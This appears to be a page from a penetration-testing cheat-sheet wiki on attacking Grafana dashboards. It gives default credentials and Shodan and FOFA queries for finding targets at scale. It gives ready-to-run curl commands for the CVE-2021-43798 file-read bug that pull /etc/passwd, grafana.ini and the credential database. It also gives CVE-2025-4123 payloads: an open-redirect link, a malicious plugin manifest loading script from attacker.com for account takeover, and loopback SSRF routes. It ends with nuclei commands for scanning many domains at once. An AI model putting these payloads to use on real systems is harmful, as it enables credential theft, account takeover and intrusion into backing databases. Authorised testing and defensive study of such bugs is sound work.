---
tags:
  - Web
---

# :material-chart-areaspline: Grafana

<span class="pill pill-medium">dashboards</span> <span class="pill pill-info">web</span>

Grafana dashboards sit in front of data sources (Prometheus, SQL, cloud) and hold
their credentials. Default creds and a well-known path-traversal make it a quick win.

!!! abstract "TL;DR"
    Try `admin:admin` → check version for **CVE-2021-43798** (unauth arbitrary file
    read) → dump data-source credentials → pivot into the backing databases.

## :material-magnify: Identify

```bash
curl -s http://$TARGET:3000/login | grep -i grafana
curl -s http://$TARGET:3000/api/health          # {"version":"8.x.x", ...}
```

Grafana instances are usually published on public dashboards, so build the target
list from internet-wide indexes first.

*From "How One Path Traversal in Grafana Unleashed XSS, Open Redirect and SSRF (CVE-2025-4123)" by coffinxp (InfoSec Write-ups).*

Shodan:

```text
hostname:"domain.com" title:"Grafana"
product:"Grafana"
```

FOFA — the last query pins an exact build, which is how you pre-filter for a
version-specific CVE:

```text
app="Grafana"
domain="domain.com" && "Grafana"
domain="domain.com" && "Grafana" && icon_hash="2123863676"
app="Grafana" && (body="Grafana v11.6.0")
```

## :material-file-eye: CVE-2021-43798 — unauth path traversal

Read any file (Grafana 8.0.0–8.3.0) via a plugin path:

```bash
curl --path-as-is "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
# The prize: Grafana's own config + its SQLite DB (contains data-source secrets)
curl --path-as-is "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
curl --path-as-is "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db"
```

!!! loot "grafana.db holds data-source creds"
    The SQLite DB has the admin hash + AES-encrypted data-source passwords
    (decryptable with the `secret_key` from `grafana.ini`) → pivot into
    Prometheus/MySQL/cloud data sources.

## :material-swap-horizontal-bold: CVE-2025-4123 — client path traversal → XSS / open redirect / SSRF

*From "How One Path Traversal in Grafana Unleashed XSS, Open Redirect and SSRF (CVE-2025-4123)" by coffinxp (InfoSec Write-ups).*

This one is **client-side**: the frontend never normalises the paths it uses for
plugin loading and navigation, so encoded `../`, backslashes and double-encoding
escape the intended directory. Whatever the router ends up with is treated as a
local resource — including an attacker's domain or an internal IP. One flaw, three
outcomes: script loading (XSS), navigation (open redirect), and resource fetching
(client-side SSRF). See [Path Traversal](../web/path-traversal.md#cspt) for the
general class.

**Open redirect.** Backslash plus percent-encoding smuggles an external host into the
routing logic — the link starts on the trusted Grafana origin, so it is phishing-grade:

```text
https://domain.com/public/..%2F%5coast.pro%2F%3f%2F..%2F..
```

**Account takeover via XSS.** Host a plugin manifest whose `module` points at your
JavaScript:

```text
{
    "name": "ExploitPluginReq",
    "type": "app",
    "id": "grafana-lokiexplore-app",
    "enabled": true,
    "pinned": true,
    "autoEnabled": true,
    "module": "http://attacker.com/file?js=file", //malicious js file
    "baseUrl": "public/plugins/grafana-lokiexplore-app",
    "info": {
        "author": {...}
    }
    ...
}
```

Then send the victim to a route that traverses out into your domain, so Grafana loads
it as if it were a local plugin and executes the script in-origin:

```text
/a/..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23/explore
```

Script execution on the Grafana origin means the session is yours — read the API as
the victim, create an API key or add an admin user.

**Client-side SSRF.** Same shape, internal target: the browser is coerced into
fetching from loopback, which reaches services that are not exposed externally:

```text
/a/..%2f..%2f..%2fpublic%2f..%252f%255C127.0.0.1%252f%253Fp%252f..%252f..%23/explore
```

Point it at metadata endpoints or internal admin ports to probe the network from
inside the victim's browser → [SSRF](../web/ssrf.md).

Feed the Shodan/FOFA target list above straight into the CVE template to confirm at
scale:

```bash
echo domain.com | nuclei -t /nuclei-templates/http/cves/2025/CVE-2025-4123.yaml
cat domains.txt | nuclei -t /nuclei-templates/http/cves/2025/CVE-2025-4123.yaml
```

Background: ProjectDiscovery's write-up *"Grafana — XSS / Open Redirect / SSRF via
Client Path Traversal"*.

## :material-fire: Authenticated

```text
# admin → data sources → SQL data source → run arbitrary queries on the backend DB
# admin → can add users, API keys; some versions allow SSRF via data-source proxy
```

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Data-source proxy → [SSRF](../web/ssrf.md); backing DBs → [MSSQL](../network/mssql.md).
- Reference: [HackTricks Grafana](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grafana.html).
